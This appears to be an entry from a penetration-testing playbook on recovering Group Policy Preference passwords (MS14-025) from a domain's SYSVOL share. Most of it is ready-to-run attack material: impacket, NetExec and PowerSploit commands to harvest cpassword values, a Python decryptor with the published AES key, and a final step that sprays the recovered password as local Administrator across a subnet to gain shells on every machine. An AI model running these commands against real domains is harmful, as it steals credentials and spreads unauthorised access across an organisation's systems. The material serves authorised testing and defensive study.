---
id: windows-gpp-creds
title: GPP Credentials (MS14-025)
stage: privesc
tags: [windows, ad]
summary: Decrypt AES-encrypted passwords from Group Policy Preference XML files on SYSVOL — the key is public knowledge, and old entries persist indefinitely despite the 2014 patch.
leads_to:
  - password-spray
  - system-shell
  - domain-admin
---

## Prerequisites

Valid domain credentials (any user). SYSVOL readable (default for all authenticated domain users). The `cpassword` attribute present in any GPP XML file on SYSVOL — check with impacket or CME before manual searching.

Group Policy Preferences allowed admins to set local passwords, map drives, and create tasks — all stored as XML on SYSVOL. Microsoft published the AES-256 key used to encrypt `cpassword` in 2012. MS14-025 (May 2014) prevented new GPP passwords from being created but did not remove existing entries. These passwords are often local Administrator credentials and are frequently reused across all domain machines.

## Quick Win

> impacket-Get-GPPPassword searches SYSVOL remotely — runs from Linux with any domain cred.

```bash
impacket-Get-GPPPassword domain.local/user:password@$DC
```

## Search SYSVOL from Linux

> Three methods — impacket is fastest, CME modules catch autologon entries too.

```bash
impacket-Get-GPPPassword domain.local/user:password@$DC

# Via CME
nxc smb $DC -u user -p password -M gpp_password
nxc smb $DC -u user -p password -M gpp_autologin

# Manual via smbclient
smbclient //DC/SYSVOL -U 'domain\user%password'
# > recurse; ls *.xml
```

## Search SYSVOL from Windows

> findstr directly on the SYSVOL share — fast and requires no tools.

```powershell
findstr /S /I cpassword \\$DC\SYSVOL\*.xml
findstr /S /I cpassword \\$DOMAIN\SYSVOL\*.xml

# PowerSploit
Import-Module .\PowerSploit.ps1
Get-GPPPassword
Get-GPPAutologon
```

## Decrypt cpassword Manually

> The AES key is published — Python decryption or gpp-decrypt on Kali.

```python
import base64
from Crypto.Cipher import AES

def decrypt_gpp(cpassword):
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb3\x54\x1a'
    pad = len(cpassword) % 4
    if pad: cpassword += '=' * (4 - pad)
    data = base64.b64decode(cpassword)
    cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 16)
    return cipher.decrypt(data).rstrip(b'\x00\x10').decode('utf-16-le')

print(decrypt_gpp("YOUR_CPASSWORD_VALUE"))
```

```bash
# Kali shortcut
gpp-decrypt <cpassword_value>
```

## Common GPP XML File Locations

> Know where to look if automated tools miss something.

```
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\User\Preferences\Drives\Drives.xml
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Services\Services.xml
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

## Leads To

GPP password decrypted → spray it against all domain machines as local Administrator (`nxc smb 192.168.x.0/24 -u Administrator -p GPP_PASS --local-auth`) → system-shell on every machine sharing that local admin password. Autologon credential → domain account → domain-admin path. Password matches → password-spray to confirm scope.
